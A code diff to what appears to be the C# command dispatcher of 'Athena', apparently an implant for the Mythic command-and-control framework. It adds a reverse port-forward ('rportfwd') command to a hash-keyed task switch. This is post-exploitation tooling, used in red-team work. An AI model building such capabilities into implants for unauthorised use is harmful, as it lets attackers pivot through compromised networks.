@@ -25,6 +25,9 @@ namespace Athena.Commands
         public event EventHandler<TaskEventArgs> ExitRequested;
         public event EventHandler<TaskEventArgs> ListForwarders;
         public event EventHandler<TaskEventArgs> ListProfiles;
+        public event EventHandler<TaskEventArgs> StartRportFwd;
+        public event EventHandler<TaskEventArgs> StopRportFwd;
+
         private AssemblyHandler assemblyHandler { get; }
         private DownloadHandler downloadHandler { get; }
         private UploadHandler uploadHandler { get; }
@@ -128,6 +131,17 @@ namespace Athena.Commands
                 case "E659634F6A18B0CACD0AB3C3A95845A7": //reset-assembly-context
                     TaskResponseHandler.AddResponse(await assemblyHandler.ClearAssemblyLoadContext(job));
                     TaskResponseHandler.activeJobs.Remove(task.id, out _);
+                    break;
+                case "A493BE856D57B5F75C1878FDA4A276B5": //rportfwd
+                    var dict = Misc.ConvertJsonStringToDict(job.task.parameters);
+
+                    if (dict["action"].ToLower() == "start")
+                    {
+                        StartForwarder(this, new TaskEventArgs(job));
+                        break;
+                    }
+
+                    StopForwarder(this, new TaskEventArgs(job));  
                     break;
                 case "C9FAB33E9458412C527C3FE8A13EE37D": //sleep
                     UpdateSleepAndJitter(job);
@@ -337,7 +351,7 @@ namespace Athena.Commands
                 task_id = job.task.id,
                 status = "error",
             };
-        }      
+        }
         private async Task<string> LoadCommandAsync(MythicJob job)
         {
             LoadCommand command = JsonSerializer.Deserialize(job.task.parameters, LoadCommandJsonContext.Default.LoadCommand);
